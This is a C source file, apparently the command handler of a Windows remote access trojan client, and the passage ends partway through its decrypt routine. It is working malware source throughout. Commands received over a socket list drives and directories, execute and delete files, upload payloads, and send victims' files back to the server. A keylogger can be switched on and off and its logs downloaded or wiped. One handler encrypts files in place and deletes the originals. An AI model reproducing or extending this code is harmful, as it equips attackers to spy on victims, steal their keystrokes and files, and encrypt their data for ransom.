// src/command_handler.c
#include <command_handler.h>
#include <windows.h>
#include <shlwapi.h> // For PathCombineW, PathFindFileNameW
#include <stdio.h>   // For FILE, _wfopen_s, fwrite, fclose, _wremove
#include <debug_print.h>
#include <wchar.h>
#include <helpers/utils.h>
#include <helpers/keylogger.h>
#include <service/network_service.h>
#include <service/encryption_service.h>

// --- Forward Declarations for Command Handlers ---
static void handle_list_drives(SOCKET sock, cJSON* commandJson);
static void handle_list_directory(SOCKET sock, cJSON* commandJson);
static void handle_execute_file(SOCKET sock, cJSON* commandJson);
static void handle_delete_file(SOCKET sock, cJSON* commandJson);
static void handle_rename_file(SOCKET sock, cJSON* commandJson);
static void handle_upload_file(SOCKET sock, cJSON* commandJson, char* binaryData, uint32_t binarySize);
static void handle_download_file(SOCKET sock, cJSON* commandJson);
static void handle_restart_connection(SOCKET sock, cJSON* commandJson);
static void handle_encrypt_file(SOCKET sock, cJSON* commandJson);
static void handle_decrypt_file(SOCKET sock, cJSON* commandJson);
static void handle_keylogger_command(SOCKET sock, cJSON* commandJson);

// --- Main Dispatcher ---
void HandleServerCommand(SOCKET sock, cJSON* commandJson, char* binaryData, uint32_t binarySize) {
    if (!commandJson) {
        DEBUG_PRINT("Received NULL command JSON.");
        return;
    }

    cJSON* commandItem = cJSON_GetObjectItemCaseSensitive(commandJson, "command");
    if (!cJSON_IsString(commandItem) || (commandItem->valuestring == NULL)) {
        DEBUG_PRINT("Received invalid command format: no 'command' string.");
        return;
    }

    char* command = commandItem->valuestring;
    DEBUG_PRINT("Received command: %s", command);

    if (strcmp(command, "GET_DRIVES") == 0) {
        handle_list_drives(sock, commandJson);
    } else if (strcmp(command, "LIST") == 0) {
        handle_list_directory(sock, commandJson);
    } else if (strcmp(command, "EXEC") == 0) {
        handle_execute_file(sock, commandJson);
    } else if (strcmp(command, "DELETE") == 0) {
        handle_delete_file(sock, commandJson);
    } else if (strcmp(command, "RENAME") == 0) {
        handle_rename_file(sock, commandJson);
    } else if (strcmp(command, "UPLOAD_FILE") == 0) {
        handle_upload_file(sock, commandJson, binaryData, binarySize);
    } else if (strcmp(command, "DOWNLOAD_FILE") == 0) {
        handle_download_file(sock, commandJson);
    } else if (strcmp(command, "ENCRYPT") == 0) {
        handle_encrypt_file(sock, commandJson);
    } else if (strcmp(command, "DECRYPT") == 0) {
        handle_decrypt_file(sock, commandJson);
    } else if (strcmp(command, "restart") == 0) {
        handle_restart_connection(sock, commandJson);
    } else if (strcmp(command, "KEYLOGGER") == 0) {
        handle_keylogger_command(sock, commandJson);
    } else if (strcmp(command, "EXIT") == 0) {
        DEBUG_PRINT("Received EXIT command. Shutting down.");
        Sleep(2000);
        closesocket(sock);
        exit(0);
    } else {
        DEBUG_PRINT("Unknown command received: %s", command);
    }
}

// --- Command Handler Implementations ---

static void handle_list_drives(SOCKET sock, cJSON* commandJson) {
    DEBUG_PRINT("Executing GET_DRIVES command.");
    cJSON* response = cJSON_CreateObject();
    cJSON* drives = cJSON_CreateArray();

    char driveStrings[256];
    DWORD drivesLength = GetLogicalDriveStringsA(sizeof(driveStrings) - 1, driveStrings);
    if (drivesLength > 0 && drivesLength < sizeof(driveStrings)) { // Check for buffer overflow
        char* p = driveStrings;
        while (*p) {
            cJSON_AddItemToArray(drives, cJSON_CreateString(p));
            p += strlen(p) + 1; // Move to the next string
        }
    } else {
        DEBUG_PRINT("GetLogicalDriveStringsA failed or buffer too small. Error: %lu", GetLastError());
    }

    cJSON_AddItemToObject(response, "drives", drives);
    cJSON_AddStringToObject(response, "status", "ok");
    SendJsonRequest(sock, response);
    cJSON_Delete(response);
}

static void handle_list_directory(SOCKET sock, cJSON* commandJson) {
    cJSON* pathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "path");
    cJSON* showHiddenItem = cJSON_GetObjectItemCaseSensitive(commandJson, "show_hidden");
    BOOL showHidden = cJSON_IsTrue(showHiddenItem);

    if (!cJSON_IsString(pathItem)) {
        DEBUG_PRINT("LIST command missing 'path'.");
        return;
    }

    DEBUG_PRINT("Executing LIST command for path: %s (Show Hidden: %s)", pathItem->valuestring, showHidden ? "TRUE" : "FALSE");

    wchar_t* pathW = ConvertCHARToWCHAR(pathItem->valuestring);
    if (!pathW) {
        DEBUG_PRINT("Failed to convert path to WCHAR.");
        return;
    }

    wchar_t searchPath[MAX_PATH];
    if (PathCombineW(searchPath, pathW, L"*") == NULL) { // Use PathCombineW safely
        DEBUG_PRINT("Failed to combine path for search.");
        free(pathW);
        return;
    }
    free(pathW); // Free pathW after use

    cJSON* response = cJSON_CreateObject();
    cJSON* items = cJSON_CreateArray();

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath, &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
                continue;
            }
            // Skip hidden files if showHidden is FALSE
            if (!showHidden && (findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)) {
                continue;
            }

            cJSON* fileInfo = cJSON_CreateObject();
            char* nameUtf8 = ConvertWCHARToCHAR(findData.cFileName);
            if (nameUtf8) {
                cJSON_AddStringToObject(fileInfo, "name", nameUtf8);
                free(nameUtf8);
            } else {
                DEBUG_PRINT("Failed to convert filename to UTF-8: %ls", findData.cFileName);
                cJSON_Delete(fileInfo);
                continue;
            }

            // Get and format the date modified
            FILETIME ftLocal;
            SYSTEMTIME stLocal;
            wchar_t dateBuffer[128];

            if (FileTimeToLocalFileTime(&findData.ftLastWriteTime, &ftLocal) &&
                FileTimeToSystemTime(&ftLocal, &stLocal)) {

                swprintf_s(dateBuffer, _countof(dateBuffer),
                         L"%04d-%02d-%02d %02d:%02d",
                         stLocal.wYear, stLocal.wMonth, stLocal.wDay,
                         stLocal.wHour, stLocal.wMinute);

                char* dateUtf8 = ConvertWCHARToCHAR(dateBuffer);
                if (dateUtf8) {
                    cJSON_AddStringToObject(fileInfo, "date_modified", dateUtf8);
                    free(dateUtf8);
                }
            }

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                cJSON_AddStringToObject(fileInfo, "type", "dir");
            } else {
                cJSON_AddStringToObject(fileInfo, "type", "file");
                LARGE_INTEGER fileSize;
                fileSize.LowPart = findData.nFileSizeLow;
                fileSize.HighPart = findData.nFileSizeHigh;
                cJSON_AddNumberToObject(fileInfo, "size", (double)fileSize.QuadPart);
            }
            cJSON_AddItemToArray(items, fileInfo);
        } while (FindNextFileW(hFind, &findData) != 0);
        FindClose(hFind);
    } else {
        DEBUG_PRINT("FindFirstFileW failed for %ls. Error: %lu", searchPath, GetLastError());
    }

    cJSON_AddItemToObject(response, "items", items);
    cJSON_AddStringToObject(response, "status", "ok");
    SendJsonRequest(sock, response);
    cJSON_Delete(response);
}

static void handle_execute_file(SOCKET sock, cJSON* commandJson) {
    cJSON* pathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "path");
    if (!cJSON_IsString(pathItem)) {
        DEBUG_PRINT("EXEC command missing 'path'.");
        return;
    }

    DEBUG_PRINT("Executing EXEC command for: %s", pathItem->valuestring);
    wchar_t* pathW = ConvertCHARToWCHAR(pathItem->valuestring);
    if (!pathW) {
        DEBUG_PRINT("Failed to convert path to WCHAR.");
        return;
    }

    HINSTANCE result = ShellExecuteW(NULL, L"open", pathW, NULL, NULL, SW_SHOWNORMAL);
    

    cJSON* response = cJSON_CreateObject();
    
    if ((INT_PTR)result <= 32) { // ShellExecute returns <= 32 on error
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "unknown");
        DEBUG_PRINT("ShellExecuteW failed for '%ls'. Error code: %ld", pathW, result);
    } else {
        cJSON_AddStringToObject(response, "status", "success");
        DEBUG_PRINT("ShellExecuteW succeeded for '%ls'.", pathW);
    }
    SendJsonRequest(sock, response);
    cJSON_Delete(response);
    free(pathW);
}

static void handle_delete_file(SOCKET sock, cJSON* commandJson) {
    cJSON* pathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "path");
    if (!cJSON_IsString(pathItem)) {
        DEBUG_PRINT("DELETE command missing 'path'.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Invalid command format.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    DEBUG_PRINT("Executing DELETE command for: %s", pathItem->valuestring);
    wchar_t* pathW = ConvertCHARToWCHAR(pathItem->valuestring);
    if (!pathW) {
        DEBUG_PRINT("Failed to convert path to WCHAR.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Path conversion failed.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    BOOL success = FALSE;
    DWORD err = 0;

    // First, try to delete as a file
    if (DeleteFileW(pathW)) {
        success = TRUE;
    } else {
        err = GetLastError();
        // If it failed, try to remove as a directory (empty directory)
        if (err == ERROR_ACCESS_DENIED || err == ERROR_SHARING_VIOLATION || err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) {
            if (RemoveDirectoryW(pathW)) {
                success = TRUE;
            } else {
                err = GetLastError(); // Get last error for RemoveDirectoryW
            }
        }
    }


    cJSON* response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "status", success ? "success" : "failed");
    if (!success) {
        char errMsg[256];
        sprintf_s(errMsg, sizeof(errMsg), "Error deleting/removing: %lu", err);
        cJSON_AddStringToObject(response, "message", errMsg);
        DEBUG_PRINT("DELETE command failed for %s. Error: %lu", pathItem->valuestring, err);
    } else {
        DEBUG_PRINT("DELETE command succeeded for %s.", pathItem->valuestring);
    }
    SendJsonRequest(sock, response);
    cJSON_Delete(response);

    free(pathW);
}

static void handle_rename_file(SOCKET sock, cJSON* commandJson) {
    cJSON* oldPathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "old_path");
    cJSON* newPathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "new_path");
    if (!cJSON_IsString(oldPathItem) || !cJSON_IsString(newPathItem)) {
        DEBUG_PRINT("RENAME command missing 'old_path' or 'new_path'.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Invalid command format.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    DEBUG_PRINT("Executing RENAME from '%s' to '%s'", oldPathItem->valuestring, newPathItem->valuestring);

    wchar_t* oldPathW = ConvertCHARToWCHAR(oldPathItem->valuestring);
    wchar_t* newPathW = ConvertCHARToWCHAR(newPathItem->valuestring);
    if (!oldPathW || !newPathW) {
        DEBUG_PRINT("Failed to convert old/new paths to WCHAR.");
        if (oldPathW) free(oldPathW);
        if (newPathW) free(newPathW);
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Path conversion failed.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    BOOL success = MoveFileW(oldPathW, newPathW);

    cJSON* response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "status", success ? "success" : "failed");
    if (!success) {
        DWORD err = GetLastError();
        char errMsg[256];
        sprintf_s(errMsg, sizeof(errMsg), "Error renaming: %lu", err);
        cJSON_AddStringToObject(response, "message", errMsg);
        DEBUG_PRINT("RENAME command failed. Error: %lu", err);
    } else {
        DEBUG_PRINT("RENAME command succeeded.");
    }
    SendJsonRequest(sock, response);
    cJSON_Delete(response);

    free(oldPathW);
    free(newPathW);
}

static void handle_upload_file(SOCKET sock, cJSON* commandJson, char* binaryData, uint32_t binarySize) {
    cJSON* destDirItem = cJSON_GetObjectItemCaseSensitive(commandJson, "dest_dir");
    cJSON* fileNameItem = cJSON_GetObjectItemCaseSensitive(commandJson, "file_name");

    if (!cJSON_IsString(destDirItem) || !cJSON_IsString(fileNameItem)) {
        DEBUG_PRINT("UPLOAD_FILE command missing 'dest_dir' or 'file_name'.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Invalid command format: missing dir/name.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    // This is a critical check for upload!
    if (binaryData == NULL || binarySize == 0) {
        DEBUG_PRINT("UPLOAD_FILE command received, but no binary data or 0-size binary data.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "No binary data received for upload.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    DEBUG_PRINT("Executing UPLOAD_FILE command. Dest Dir: %s, File Name: %s, Size: %u bytes",
                destDirItem->valuestring, fileNameItem->valuestring, binarySize);

    // Construct full remote path
    wchar_t* destDirW = ConvertCHARToWCHAR(destDirItem->valuestring);
    wchar_t* fileNameW = ConvertCHARToWCHAR(fileNameItem->valuestring);
    if (!destDirW || !fileNameW) {
        DEBUG_PRINT("Failed to convert paths to WCHAR for upload. Dest Dir: %s, File Name: %s", destDirItem->valuestring, fileNameItem->valuestring);
        if (destDirW) free(destDirW);
        if (fileNameW) free(fileNameW);
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Path conversion failed.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    wchar_t fullPathW[MAX_PATH];
    if (PathCombineW(fullPathW, destDirW, fileNameW) == NULL) { // Use PathCombineW safely
        DEBUG_PRINT("Failed to combine full path for upload. Dir: %ls, Name: %ls", destDirW, fileNameW);
        free(destDirW);
        free(fileNameW);
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Failed to construct destination path.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    free(destDirW); // Free after use
    free(fileNameW); // Free after use

    FILE* outFile = NULL;
    BOOL success = FALSE;
    char responseMessage[256] = "Unknown error.";
    DWORD lastError = 0;
    errno_t err_code; // For _wfopen_s

    DEBUG_PRINT("Attempting to open file '%ls' for writing.", fullPathW);
    err_code = _wfopen_s(&outFile, fullPathW, L"wb");
    if (err_code == 0 && outFile) {
        DEBUG_PRINT("File '%ls' opened successfully for writing. Binary size: %u bytes.", fullPathW, binarySize);
        size_t bytesWritten = fwrite(binaryData, 1, binarySize, outFile);
        if (bytesWritten == binarySize) {
            success = TRUE;
            strcpy_s(responseMessage, sizeof(responseMessage), "File uploaded successfully.");
            DEBUG_PRINT("File '%ls' written successfully (%u bytes).", fullPathW, binarySize);
        } else {
            lastError = GetLastError(); // Get Windows API error
            // Fallback for C runtime error if fwrite didn't report a WinAPI error
            if (lastError == 0) lastError = err_code;
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to write all data to file. Expected %u, wrote %zu. Error: %lu", binarySize, bytesWritten, lastError);
            DEBUG_PRINT("Failed to write all data to file '%ls'. Expected %u, wrote %zu. Error: %lu", fullPathW, binarySize, bytesWritten, lastError);
            // Attempt to delete partial file if write failed
            fclose(outFile); // Close before deleting
            outFile = NULL;
            _wremove(fullPathW);
        }
        if (outFile) fclose(outFile); // Ensure file is closed if it was opened
    } else {
        lastError = GetLastError(); // Get Windows API error
        // Fallback for C runtime error if _wfopen_s didn't report a WinAPI error
        if (lastError == 0) lastError = err_code;
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to open file for writing. Error: %lu", lastError);
        DEBUG_PRINT("Failed to open file '%ls' for writing. Error: %lu", fullPathW, lastError);
    }

    cJSON* response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "status", success ? "success" : "failed");
    cJSON_AddStringToObject(response, "message", responseMessage);
    SendJsonRequest(sock, response);
    cJSON_Delete(response);
}

static void handle_download_file(SOCKET sock, cJSON* commandJson) {
    cJSON* pathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "path");
    if (!cJSON_IsString(pathItem)) {
        DEBUG_PRINT("DOWNLOAD_FILE command missing 'path'.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Invalid command format.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    DEBUG_PRINT("Executing DOWNLOAD_FILE command for: %s", pathItem->valuestring);

    wchar_t* pathW = ConvertCHARToWCHAR(pathItem->valuestring);
    if (!pathW) {
        DEBUG_PRINT("Failed to convert path to WCHAR for download.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Path conversion failed.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    FILE* inFile = NULL;
    cJSON* responseJson = cJSON_CreateObject();
    char responseMessage[256];
    BOOL fileOpened = FALSE;
    DWORD lastError = 0;
    errno_t err_code; // For _wfopen_s

    DEBUG_PRINT("Attempting to open file '%ls' for reading.", pathW);
    err_code = _wfopen_s(&inFile, pathW, L"rb");
    if (err_code == 0 && inFile) {
        fileOpened = TRUE;
        cJSON_AddStringToObject(responseJson, "status", "success");
        strcpy_s(responseMessage, sizeof(responseMessage), "File opened successfully for sending.");
        DEBUG_PRINT("File '%ls' opened successfully for sending.", pathW);
    } else {
        lastError = GetLastError(); // Get Windows API error
        // Fallback for C runtime error if _wfopen_s didn't report a WinAPI error
        if (lastError == 0) lastError = err_code;
        cJSON_AddStringToObject(responseJson, "status", "failed");
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to open file. Error: %lu", lastError);
        cJSON_AddStringToObject(responseJson, "message", responseMessage);
        DEBUG_PRINT("Failed to open file '%ls' for download. Error: %lu", pathW, lastError);
    }

    // Use SendFileRequest to send JSON (responseJson) AND the binary file (if fileOpened)
    // If fileOpened is FALSE, the file_path will be NULL, and SendFileRequest will send only JSON.
    BOOL sendSuccess = SendFileRequest(sock, responseJson, fileOpened ? pathW : NULL, NULL, NULL);

    if (!sendSuccess) {
        DEBUG_PRINT("SendFileRequest failed for download response of '%ls'.", pathW);
    } else {
        DEBUG_PRINT("SendFileRequest succeeded for download response of '%ls'.", pathW);
    }

    cJSON_Delete(responseJson);
    if (inFile) fclose(inFile); // Ensure file is closed
    if (pathW) free(pathW);
}

// --- Command Handler Implementations ---

/**
 * @brief Handles keylogger commands: "on", "off", "download", and "delete_logs".
 *
 * This function parses the JSON command to determine the requested action.
 * - on: Starts the keylogger thread.
 * - off: Stops the keylogger thread.
 * - download: Finds and sends the "logged.txt" file back to the server.
 * - delete_logs: Deletes the "logged.txt" file from the disk.
 *
 * @param sock The socket for communicating with the server.
 * @param commandJson The parsed cJSON object containing the command details.
 */
static void handle_keylogger_command(SOCKET sock, cJSON* commandJson) {
    cJSON* actionItem = cJSON_GetObjectItemCaseSensitive(commandJson, "action");
    if (!cJSON_IsString(actionItem) || (actionItem->valuestring == NULL)) {
        DEBUG_PRINT("KEYLOGGER command missing 'action' parameter.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Missing 'action' (expected 'on', 'off', 'download', 'delete_logs').");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    char* action = actionItem->valuestring;

    // --- ON Action ---
    if (strcmp(action, "on") == 0) {
        DEBUG_PRINT("Executing KEYLOGGER ON command.");
        cJSON* response = cJSON_CreateObject();
        if (StartKeylogger()) {
            cJSON_AddStringToObject(response, "status", "success");
            cJSON_AddStringToObject(response, "message", "Keylogger started successfully.");
        } else {
            cJSON_AddStringToObject(response, "status", "failed");
            cJSON_AddStringToObject(response, "message", "Failed to start keylogger (may already be running).");
        }
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
    }
    // --- OFF Action ---
    else if (strcmp(action, "off") == 0) {
        DEBUG_PRINT("Executing KEYLOGGER OFF command.");
        cJSON* response = cJSON_CreateObject();
        if (StopKeylogger()) {
            cJSON_AddStringToObject(response, "status", "success");
            cJSON_AddStringToObject(response, "message", "Keylogger stopped successfully.");
        } else {
            cJSON_AddStringToObject(response, "status", "failed");
            cJSON_AddStringToObject(response, "message", "Failed to stop keylogger (may not be running).");
        }
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
    }
    // --- DOWNLOAD Action ---
    else if (strcmp(action, "download") == 0) {
        DEBUG_PRINT("Executing KEYLOGGER DOWNLOAD command.");

        wchar_t logFilePath[] = L"logged.txt";

        FILE* inFile = NULL;
        cJSON* responseJson = cJSON_CreateObject();
        char responseMessage[256] = {0};
        BOOL fileOpened = FALSE;
        DWORD lastError = 0;
        errno_t err_code;

        DEBUG_PRINT("Attempting to open keylogger file '%ls' for reading.", logFilePath);
        err_code = _wfopen_s(&inFile, logFilePath, L"rb");
        if (err_code == 0 && inFile) {
            fileOpened = TRUE;
            cJSON_AddStringToObject(responseJson, "status", "success");
            strcpy_s(responseMessage, sizeof(responseMessage), "Log file opened successfully for sending.");
            cJSON_AddStringToObject(responseJson, "message", responseMessage);
            DEBUG_PRINT("Keylogger file '%ls' opened successfully for sending.", logFilePath);
        } else {
            lastError = GetLastError();
            if (lastError == 0) lastError = err_code;
            cJSON_AddStringToObject(responseJson, "status", "failed");
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to open log file. Error: %lu", lastError);
            cJSON_AddStringToObject(responseJson, "message", responseMessage);
            DEBUG_PRINT("Failed to open keylogger file '%ls' for download. Error: %lu", logFilePath, lastError);
        }

        // Use SendFileRequest to send JSON + binary (if fileOpened)
        BOOL sendSuccess = SendFileRequest(sock, responseJson, fileOpened ? logFilePath : NULL, NULL, NULL);
        if (!sendSuccess) {
            DEBUG_PRINT("SendFileRequest failed for keylogger download of '%ls'.", logFilePath);
        } else {
            DEBUG_PRINT("SendFileRequest succeeded for keylogger download of '%ls'.", logFilePath);
        }

        // cleanup
        cJSON_Delete(responseJson);
        if (inFile) fclose(inFile);
    }
    // --- DELETE LOGS Action ---
    else if (strcmp(action, "delete_logs") == 0) {
        DEBUG_PRINT("Executing KEYLOGGER DELETE_LOGS command.");
        wchar_t logFilePath[] = L"logged.txt";
        cJSON* response = cJSON_CreateObject();
        
        if (DeleteFileW(logFilePath)) {
            cJSON_AddStringToObject(response, "status", "success");
            cJSON_AddStringToObject(response, "message", "Log file 'logged.txt' was deleted.");
        } else {
            DWORD err = GetLastError();
            char errMsg[256];
            if (err == ERROR_FILE_NOT_FOUND) {
                sprintf_s(errMsg, sizeof(errMsg), "Log file not found, nothing to delete.");
            } else {
                sprintf_s(errMsg, sizeof(errMsg), "Could not delete log file. Error: %lu", err);
            }
            cJSON_AddStringToObject(response, "status", "failed");
            cJSON_AddStringToObject(response, "message", errMsg);
        }
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
    }
    // --- UNKNOWN Action ---
    else {
        DEBUG_PRINT("KEYLOGGER command with unknown action: %s", action);
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Unknown action. Use 'on', 'off', 'download', or 'delete_logs'.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
    }
}
static void handle_encrypt_file(SOCKET sock, cJSON* commandJson) {
    cJSON* pathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "path");
    cJSON* keyItem = cJSON_GetObjectItemCaseSensitive(commandJson, "key");
    cJSON* ivItem = cJSON_GetObjectItemCaseSensitive(commandJson, "iv");

    if (!cJSON_IsString(pathItem) || !cJSON_IsString(keyItem) || !cJSON_IsString(ivItem)) {
        DEBUG_PRINT("ENCRYPT command missing required parameters.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Invalid command format: missing path, key, or iv.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    DEBUG_PRINT("Executing ENCRYPT command for: %s", pathItem->valuestring);
    
    wchar_t* pathW = ConvertCHARToWCHAR(pathItem->valuestring);
    if (!pathW) {
        DEBUG_PRINT("Failed to convert path to WCHAR for encryption.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Path conversion failed.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    // Create a temporary file for the encrypted content
    wchar_t tempPathW[MAX_PATH];
    if (!GetTempFileNameW(L".", L"enc", 0, tempPathW)) {
        DEBUG_PRINT("Failed to create temporary file for encryption.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Failed to create temporary file.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        free(pathW);
        return;
    }

    FILE* inFile = NULL;
    FILE* outFile = NULL;
    BOOL success = FALSE;
    char responseMessage[256] = {0};
    
    errno_t err = _wfopen_s(&inFile, pathW, L"rb");
    if (err != 0 || !inFile) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to open source file for reading.");
        DEBUG_PRINT("Failed to open source file for reading: %ls", pathW);
        goto cleanup_encrypt;
    }

    err = _wfopen_s(&outFile, tempPathW, L"wb");
    if (err != 0 || !outFile) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to open temp file for writing.");
        DEBUG_PRINT("Failed to open temp file for writing: %ls", tempPathW);
        goto cleanup_encrypt;
    }

    // Initialize AES context
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    
    // Convert key and IV strings to bytes
    const BYTE* keyBytes = (const BYTE*)keyItem->valuestring;
    const BYTE* ivBytes = (const BYTE*)ivItem->valuestring;
    DWORD keyLen = (DWORD)strlen(keyItem->valuestring);
    DWORD ivLen = (DWORD)strlen(ivItem->valuestring);
    
    // Initialize AES key
    if (!InitAESKey(&hProv, &hKey, keyBytes, keyLen, ivBytes)) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to initialize AES key.");
        DEBUG_PRINT("Failed to initialize AES key.");
        goto cleanup_encrypt;
    }
    
    // Process file in chunks
    const size_t CHUNK_SIZE = 64 * 1024; // 64KB chunks
    BYTE* readBuffer = (BYTE*)malloc(CHUNK_SIZE);
    BYTE* cryptoBuffer = (BYTE*)malloc(CHUNK_SIZE + AES_BLOCK_SIZE); // Extra space for padding
    
    if (!readBuffer || !cryptoBuffer) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Memory allocation failed for buffers.");
        DEBUG_PRINT("Memory allocation failed for buffers.");
        goto cleanup_encrypt;
    }

    size_t bytesRead;
    BOOL finalBlock = FALSE;
    
    while (!finalBlock && (bytesRead = fread(readBuffer, 1, CHUNK_SIZE, inFile)) > 0) {
        DWORD cryptoLen = (DWORD)bytesRead;
        
        // Check if this is the final block
        if (feof(inFile)) {
            finalBlock = TRUE;
        }
        
        // Copy data to crypto buffer
        memcpy(cryptoBuffer, readBuffer, bytesRead);
        
        // Encrypt the chunk
        if (!CryptEncrypt(hKey, 0, finalBlock, 0, cryptoBuffer, &cryptoLen, CHUNK_SIZE + AES_BLOCK_SIZE)) {
            sprintf_s(responseMessage, sizeof(responseMessage), "AES encryption failed.");
            DEBUG_PRINT("AES encryption failed for file: %ls", pathW);
            goto cleanup_encrypt;
        }
        
        // Write encrypted data to output file
        if (fwrite(cryptoBuffer, 1, cryptoLen, outFile) != cryptoLen) {
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to write encrypted data to temp file.");
            DEBUG_PRINT("Failed to write encrypted data to temp file: %ls", tempPathW);
            goto cleanup_encrypt;
        }
    }

    success = TRUE;
    strcpy_s(responseMessage, sizeof(responseMessage), "File encrypted successfully.");
    DEBUG_PRINT("File encrypted successfully: %ls", pathW);

cleanup_encrypt:
    if (readBuffer) free(readBuffer);
    if (cryptoBuffer) free(cryptoBuffer);
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    if (inFile) fclose(inFile);
    if (outFile) fclose(outFile);
    
    if (success) {
        // Replace original file with encrypted version
        if (_wremove(pathW) != 0) {
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to remove original file.");
            DEBUG_PRINT("Failed to remove original file: %ls", pathW);
            success = FALSE;
        } else if (_wrename(tempPathW, pathW) != 0) {
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to rename temp file to original.");
            DEBUG_PRINT("Failed to rename temp file to original: %ls -> %ls", tempPathW, pathW);
            success = FALSE;
        }
    } else {
        // Clean up temp file on failure
        _wremove(tempPathW);
    }
    
    cJSON* response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "status", success ? "success" : "failed");
    cJSON_AddStringToObject(response, "message", responseMessage);
    SendJsonRequest(sock, response);
    cJSON_Delete(response);
    free(pathW);
}

static void handle_decrypt_file(SOCKET sock, cJSON* commandJson) {
    cJSON* pathItem = cJSON_GetObjectItemCaseSensitive(commandJson, "path");
    cJSON* keyItem = cJSON_GetObjectItemCaseSensitive(commandJson, "key");
    cJSON* ivItem = cJSON_GetObjectItemCaseSensitive(commandJson, "iv");

    if (!cJSON_IsString(pathItem) || !cJSON_IsString(keyItem) || !cJSON_IsString(ivItem)) {
        DEBUG_PRINT("DECRYPT command missing required parameters.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Invalid command format: missing path, key, or iv.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    DEBUG_PRINT("Executing DECRYPT command for: %s", pathItem->valuestring);
    
    wchar_t* pathW = ConvertCHARToWCHAR(pathItem->valuestring);
    if (!pathW) {
